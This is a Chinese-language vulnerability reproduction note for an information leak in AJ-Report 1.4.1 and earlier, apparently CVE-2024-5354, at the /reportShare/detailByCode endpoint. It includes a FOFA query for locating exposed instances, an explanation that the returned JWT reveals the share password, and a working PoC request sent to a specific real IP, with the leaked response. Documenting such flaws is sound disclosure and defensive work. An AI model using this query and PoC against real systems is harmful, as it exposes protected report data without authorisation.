**漏洞名称**

AJ-Report detailByCode 信息泄露漏洞

**漏洞影响**

AJ-Report 1.4.1及以下版本

**漏洞描述**

AJ-Report 版本1.4.1及以下发现了一个被归类为问题的漏洞。该漏洞影响文件/reportShare/detailByCode中的未知代码。对参数shareToken的操纵会导致信息泄露。攻击可以远程发起。已向公众披露了此漏洞的利用方法，可能会被利用。

**FOFA搜索语句**

title="AJ-Report"

**漏洞复现**

com.anjiplus.template.gaea.business.modules.reportshare.controller.ReportShareController#detailByCode

![图片](CVE-2024-5354AJ-Report%20detailByCode%20%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E.assets/640.png)





对象实现类

![图片](CVE-2024-5354AJ-Report%20detailByCode%20%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E.assets/640-1717469838520-1.png)

根据shareCode可以获取到查询信息，然后加密后直接放回

![图片](CVE-2024-5354AJ-Report%20detailByCode%20%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E.assets/640-1717469838520-2.png)

jwt可以直接解密,直接可以获得分享密码。

![图片](CVE-2024-5354AJ-Report%20detailByCode%20%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E.assets/640-1717469838520-3.png)



POC数据包如下，其中shareCode是分享编码

```yaml
GET /reportShare/detailByCode?shareCode=QRK5ta8g HTTP/1.1
Host: 106.15.77.224
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Connection: close
Accept-Encoding: gzip
```

响应内容如下

```yaml

HTTP/1.1 200
Connection: close
Transfer-Encoding: chunked
Access-Control-Allow-Credentials: true
Access-Control-Allow-Headers: *
Access-Control-Allow-Methods: *
Access-Control-Expose-Headers: *
Content-Encoding: gzip
Content-Type: application/json;charset=UTF-8
Date: Mon, 03 Jun 2024 10:36:08 GMT
Server: nginx/1.20.1
Vary: Accept-Encoding

{"code":"200","message":"操作成功","args":null,"ext":null,"data":{"id":15,"createBy":"admin","createTime":"2023-12-29 02:09:44","updateBy":"admin","updateTime":"2023-12-29 02:09:44","version":1,"rowIndex":null,"shareCode":"QRK5ta8g","shareValidType":0,"shareValidTime":"2098-12-31 16:00:00","shareToken":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NNiJ9.eyJzaGFyZUNvZGUiOiJRUks1dGE4ZyIsInJlcG9ydENvZGUiOiJleGNlbF9kZW1vIiwiZXhwIjo0MDcwODgwMDAwLCJpYXQiOjE3MDM4MTU3ODQsInNoYXJlUGFzc3dvcmQiOiIifQ.-gcoMg8BHJTkllhWiJZEMlyQY22-aJSbM_G2VX9INASo","shareUrl":"https://ajreport.beliefteam.cn/index.html#/el/QRK5ta8g","reportCode":"excel_demo","enableFlag":1,"deleteFlag":0,"sharePassword":"","sharePPasswordFlag":false,"reportType":null}}
```

漏洞复现成功